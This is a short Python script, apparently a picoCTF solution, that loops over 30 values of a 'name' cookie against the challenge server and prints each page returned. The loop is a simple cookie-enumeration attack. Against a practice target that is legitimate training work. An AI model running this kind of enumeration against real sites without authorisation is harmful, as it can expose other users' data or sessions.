import requests

URL = "http://mercury.picoctf.net:17781/"

for i in range(0,30):

    CK = {"name":str(i)}
    response = requests.get(URL,cookies=CK)
    print(response.text)
